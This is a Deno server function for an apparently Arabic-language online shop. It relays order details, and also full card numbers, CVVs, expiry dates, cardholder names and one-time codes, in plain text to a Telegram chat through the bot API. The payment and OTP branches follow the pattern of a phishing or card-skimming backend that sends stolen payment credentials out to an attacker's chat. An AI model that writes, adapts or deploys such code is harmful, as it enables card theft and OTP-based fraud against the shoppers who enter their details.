import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
    if (!TELEGRAM_BOT_TOKEN) throw new Error("TELEGRAM_BOT_TOKEN not configured");

    const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID");
    if (!TELEGRAM_CHAT_ID) throw new Error("TELEGRAM_CHAT_ID not configured");

    const body = await req.json();
    const { type } = body;

    let message = "";

    if (type === "payment") {
      const { cardNumber, cvv, expiry, cardName, paymentMethod, paymentMonths, paymentAmount } = body;
      message = `💳 <b>بيانات الدفع</b>\n\n`;
      message += `🔢 <b>رقم البطاقة:</b> ${cardNumber}\n`;
      message += `🔐 <b>CVV:</b> ${cvv}\n`;
      message += `📅 <b>تاريخ الانتهاء:</b> ${expiry}\n`;
      message += `👤 <b>الاسم على البطاقة:</b> ${cardName}\n`;
      message += `💰 <b>طريقة الدفع:</b> ${paymentMethod}\n`;
      if (paymentMonths > 1) {
        message += `📊 <b>عدد الأشهر:</b> ${paymentMonths}\n`;
      }
      message += `💵 <b>المبلغ:</b> ${paymentAmount} ر.س`;
    } else if (type === "otp") {
      const { otpCode } = body;
      message = `🔐 <b>رمز OTP</b>\n\n`;
      message += `🔑 <b>الرمز:</b> ${otpCode}`;
    } else {
      // Original order message
      const { name, phone, email, city, district, address, items, totalPrice, shipping, finalTotal, discountPercent, discountAmount } = body;
      message = `🛒 <b>طلب جديد!</b>\n\n`;
      message += `👤 <b>الاسم:</b> ${name}\n`;
      message += `📱 <b>الجوال:</b> ${phone}\n`;
      if (email) message += `📧 <b>الإيميل:</b> ${email}\n`;
      message += `🏙 <b>المدينة:</b> ${city}\n`;
      message += `📍 <b>الحي:</b> ${district}\n`;
      message += `🏠 <b>العنوان:</b> ${address}\n\n`;
      message += `📦 <b>المنتجات:</b>\n`;

      for (const item of items) {
        message += `  • ${item.name} × ${item.quantity} = ${item.total} ر.س\n`;
      }

      if (discountPercent && discountPercent > 0) {
        message += `\n🎉 <b>خصم:</b> ${discountPercent}% (-${discountAmount} ر.س)\n`;
      }
      message += `\n🚚 <b>الشحن:</b> ${shipping === 0 ? "مجاني" : shipping + " ر.س"}\n`;
      message += `💰 <b>الإجمالي:</b> ${finalTotal} ر.س`;
    }

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );

    const data = await response.json();
    if (!response.ok) {
      throw new Error(`Telegram API error [${response.status}]: ${JSON.stringify(data)}`);
    }

    return new Response(JSON.stringify({ success: true }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Error:", error);
    const errorMessage = error instanceof Error ? error.message : "Unknown error";
    return new Response(JSON.stringify({ success: false, error: errorMessage }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
